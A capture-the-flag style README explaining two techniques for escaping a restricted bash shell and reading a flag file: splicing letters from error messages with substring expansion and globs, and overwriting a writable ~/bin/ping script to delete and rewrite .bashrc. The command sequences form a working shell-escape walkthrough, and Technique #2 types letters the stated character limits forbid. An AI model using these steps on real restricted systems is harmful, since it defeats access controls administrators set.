# Escaping a Restricted Bash Shell (rbash) 

## ( Probably, Hopefully ) 

This README walks through two complementary techniques for breaking out of a restricted `rbash` session when your keystrokes are limited. First, a **substring-expansion & glob** approach; then a **`tee` + writable-`$HOME/bin/ping`** trick that leverages your per-user `bin` directory and `.bashrc`.

---

## Table of Contents

1. [Problem Statement](#problem-statement)
2. [Technique #1: Substring-expansion & Wildcards](#technique-1-substring-expansion--wildcards)
3. [Technique #2: Overwriting a Writable `ping`](#technique-2-overwriting-a-writable-ping)
4. [Cleanup & Final Steps](#cleanup--final-steps)
5. [Notes & Caveats](#notes--caveats)

---

## Problem Statement

You’ve been dropped into `rbash` with a locked-down PATH and no ability to type letters a–z or backslashes. Allowed characters:

```
0-9  { }  $  /  ?  "  spaces  :  &  >  _  =  (  )
```

You need to:

1. **Escape** the restricted shell.
2. **Read** the flag file (`folder/flag.txt`).

---

## Technique #1: Substring-expansion & Wildcards

> **Prerequisite**: You can capture an error message into a variable.

1. **Capture an error** that contains useful letters (e.g. running a guaranteed-fail command):

   ```bash
   _1=$(/_ 2>&1)
   ```
2. **Splice out** `l` and `s` to build `ls`, then list your single folder:

   ```bash
   _2=$(${_1:32:1}${_1:29:1} 2>&1)      # “ls” → folder  
   _3=$(${_1:32:1}${_1:29:1} ${_2} 2>&1) # “ls folder” → flag.txt
   ```
3. **Use wildcard/glob** to read the flag without typing `cat`:

   ```bash
   "$(<${_2}/????????)" 2>&1            # matches “flag.txt”
   ```

   Wrap in quotes so the leading `return 0 ` from the file doesn’t get executed. Merge stderr (`2>&1`) to see the flag in the “command not found” envelope.

---

## Technique #2: Overwriting a Writable `ping`

Many `rbash` setups allow you to write into `~/bin`. If `ping` is world-writable, you can:

1. **Build a small script** to cat your `.bashrc` (or later, to remove & rewrite it):

   ```bash
   echo '#!/bin/bash'             | tee ~/bin/ping  
   echo '/bin/cat ~/.bashrc'      | tee -a ~/bin/ping
   ```
2. **Run `ping`** (your fake script) to read out your `.bashrc` lines.
3. **Delete the original** `.bashrc` and write a new one that sets `$SHELL` to an unrestricted shell:

   ```bash
   echo '/bin/rm ~/.bashrc'       | tee ~/bin/ping
   ping                           # removes old .bashrc

   echo 'export SHELL=/bin/bash'  | tee ~/.bashrc
   ```
4. **Log out & back in** — now `$SHELL` points to `/bin/bash`, your PATH resets to global defaults, and you’re back in a normal shell.
5. **Invoke a shell escape** from within `vim` (or just run `/bin/bash`) and then:

   ```bash
   ls
   ls folder
   cat folder/flag.txt
   ```

---

## Cleanup & Final Steps

* After escaping, remove your temporary scripts:

  ```bash
  rm ~/bin/ping
  ```
* Restore or archive your old `.bashrc` if needed.
* Enjoy your fully-interactive shell!

---

## Notes & Caveats

* **rbash** forbids typing any letters in commands or filenames; these tricks sidestep that by **splicing** letters from error messages or **abusing** writable user-bin directories.
* The exact substring offsets (`_1:32:1`, etc.) will vary depending on your shell’s error text.
* Always verify which binaries (`bash`, `sh`, `dash`) reside under `/usr/bin` and adjust your glob patterns (`/???/???/????`) accordingly.
* If multiple globs collide (e.g. matching `/dev/pts/ptmx` instead of `/usr/bin/bash`), narrow your pattern or target a shorter name (`sh` via `/???/???/??`).

---

